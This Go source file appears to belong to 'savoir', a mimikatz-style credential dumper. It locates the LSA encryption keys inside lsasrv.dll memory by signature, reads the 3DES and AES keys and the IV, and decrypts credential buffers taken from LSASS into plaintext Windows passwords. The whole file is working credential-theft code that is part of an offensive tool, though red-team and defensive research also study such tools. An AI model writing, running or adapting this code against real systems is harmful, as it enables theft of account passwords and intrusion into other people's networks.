package crypto

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"

	"github.com/vincd/savoir/modules/sekurlsa/packages/globals"
	"github.com/vincd/savoir/utils"
	"github.com/vincd/savoir/utils/binary"
	"github.com/vincd/savoir/utils/crypto"
	"github.com/vincd/savoir/windows"
)

type LsaSrvCryptoKeys struct {
	IV     []byte
	AESKey []byte
	DESKey []byte
}

func readCryptoKey(l utils.MemoryReader, pos binary.Pointer, offset int64) ([]byte, error) {
	ptr, _, err := l.ReadNextPointer(pos.WithOffset(offset))
	if err != nil {
		return nil, err
	}

	bcrypthandleKey := &KiwiBCryptHandleKey{}
	if err := l.ReadStructure(ptr, bcrypthandleKey); err != nil {
		return nil, err
	}

	var bcryptKeyOffset int64
	if l.BuildNumber() < windows.BuildNumberWindows8 {
		bcryptKeyOffset = binary.GetStructureFieldOffset(KiwiBCryptKeyType, "Hardkey", true)
	} else if l.BuildNumber() < windows.BuildNumberWindowsBlue {
		bcryptKeyOffset = binary.GetStructureFieldOffset(KiwiBCryptKey8Type, "Hardkey", true)
	} else {
		bcryptKeyOffset = binary.GetStructureFieldOffset(KiwiBCryptKey81Type, "Hardkey", true)
	}

	return utils.MemoryReaderArray(l, bcrypthandleKey.Key.WithOffset(bcryptKeyOffset))
}

func FindCryptoKeys(l utils.MemoryReader) (*LsaSrvCryptoKeys, error) {
	reference, err := globals.FindSignature(LsaSrvCryptoKeysSignatures, l.ProcessorArchitecture(), l.BuildNumber())
	if err != nil {
		return nil, err
	}

	sigpos, err := globals.FindSignatureInModuleMemory(l, "lsasrv.dll", reference.Pattern)
	if err != nil {
		return nil, err
	}

	iv, err := l.ReadFromPointer(sigpos.WithOffset(reference.Offsets[0]), 16)
	if err != nil {
		return nil, err
	}

	desKey, err := readCryptoKey(l, sigpos, reference.Offsets[1])
	if err != nil {
		return nil, err
	}

	aesKey, err := readCryptoKey(l, sigpos, reference.Offsets[2])
	if err != nil {
		return nil, err
	}

	c := &LsaSrvCryptoKeys{
		IV:     iv,
		DESKey: desKey,
		AESKey: aesKey,
	}

	return c, nil
}

func (l *LsaSrvCryptoKeys) Decrypt(cipherBuffer []byte) ([]byte, error) {
	if len(cipherBuffer)%8 == 0 {
		return l.DecryptTripleDES(cipherBuffer)
	} else {
		return l.DecryptAES(cipherBuffer)
	}
}

func (l *LsaSrvCryptoKeys) DecryptTripleDES(cipherBuffer []byte) ([]byte, error) {
	if len(cipherBuffer)%8 != 0 {
		// return nil, fmt.Errorf("Wrong cipher buffer size (%d %% 8 != 0).", len(cipherBuffer))
		cipherBuffer = cipherBuffer[:len(cipherBuffer)-(len(cipherBuffer)%8)]
	}

	block, err := des.NewTripleDESCipher(l.DESKey)
	if err != nil {
		return nil, err
	}

	blockMode := cipher.NewCBCDecrypter(block, l.IV[:8])
	plainBuffer := make([]byte, len(cipherBuffer))
	blockMode.CryptBlocks(plainBuffer, cipherBuffer)

	return plainBuffer, nil
}

func (l *LsaSrvCryptoKeys) DecryptAES(cipherBuffer []byte) ([]byte, error) {
	block, err := aes.NewCipher(l.AESKey)
	if err != nil {
		return nil, err
	}
	cfb := crypto.NewCFBDecrypter(block, l.IV[:aes.BlockSize])
	plainBuffer := make([]byte, len(cipherBuffer))
	cfb.XORKeyStream(plainBuffer, cipherBuffer[:])

	return plainBuffer, nil
}

func (l *LsaSrvCryptoKeys) DecryptAsStringUTF16(cipherBuffer []byte) (string, error) {
	decryptedBuffer, err := l.Decrypt(cipherBuffer)
	if err != nil {
		return "", err
	}

	return utils.UTF16DecodeFromBytesWithTrim(decryptedBuffer)
}

func (l *LsaSrvCryptoKeys) DecryptAsStringUTF8(cipherBuffer []byte) (string, error) {
	decryptedBuffer, err := l.Decrypt(cipherBuffer)
	if err != nil {
		return "", err
	}

	decryptedString := string(decryptedBuffer)

	return decryptedString, nil
}

func (l *LsaSrvCryptoKeys) DecryptAsString(cipherBuffer []byte) (string, error) {
	return l.DecryptAsStringUTF16(cipherBuffer)
}

func (l *LsaSrvCryptoKeys) DecryptCredentials(c *globals.SavoirCredential) error {
	passwordRaw, err := l.Decrypt(c.PasswordRaw)
	if err != nil {
		return err
	}
	c.PasswordRaw = passwordRaw

	if !c.IsServerAccount() {
		password, err := utils.UTF16DecodeFromBytesWithTrim(passwordRaw)
		if err != nil {
			return err
		}
		c.Password = password
	}

	return nil
}
